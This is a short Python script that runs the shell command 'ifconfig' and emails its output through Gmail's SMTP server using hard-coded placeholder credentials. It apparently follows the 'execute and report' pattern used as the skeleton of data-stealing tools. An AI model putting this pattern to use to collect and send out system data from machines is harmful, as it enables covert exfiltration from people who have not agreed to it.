#!/usr/bin/env python3

import smtplib  # https://docs.python.org/3/library/smtplib.html
import subprocess  # https://docs.python.org/3/library/subprocess.html


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "ifconfig"
result = subprocess.check_output(command, shell=True)
send_mail("username@gmail.com", "password", result)
